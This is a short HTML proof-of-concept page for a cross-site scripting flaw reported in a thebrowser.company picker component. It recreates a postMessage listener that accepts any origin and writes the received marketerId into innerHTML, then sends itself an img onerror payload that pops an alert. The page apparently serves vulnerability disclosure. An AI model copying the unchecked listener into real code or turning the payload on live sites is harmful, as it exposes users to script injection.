<!DOCTYPE html>
<html>
<head>
  <title>ðŸ”¥ PoC - thebrowser.company XSS</title>
  <style>
    body { font-family: sans-serif; background: #f4f4f4; padding: 20px; }
    #output {
      margin-top: 30px;
      background: #fff;
      padding: 20px;
      border: 2px solid #ccc;
      min-height: 50px;
    }
  </style>
</head>
<body>
  <h1>âœ… PoC: thebrowser.company XSS via postMessage</h1>
  <p>Rebuilding vulnerable picker and injecting <code>marketerId</code> content</p>

  <div id="output">[ Waiting for message... ]</div>

  <script>
    // Simulate the vulnerable picker component
    window.addEventListener("message", (event) => {
      if (event.data?.message === "OB_SHOULD_SHOW_PICKER") {
        const html = event.data.content?.marketerId?.[0] || "No marketerId";
        console.log("ðŸ“¥ Received marketerId:", html);
        document.getElementById("output").innerHTML = html;
      }
    });

    // Auto-send the payload to self (simulate cross-origin source)
    window.onload = () => {
      console.log("ðŸš€ Sending XSS payload via postMessage...");
      window.postMessage({
        message: "OB_SHOULD_SHOW_PICKER",
        content: {
          marketerId: [
            `<img src=x onerror="alert('ðŸ”¥ XSS Executed from PoC')">`
          ]
        }
      }, "*");
    };
  </script>
</body>
</html>
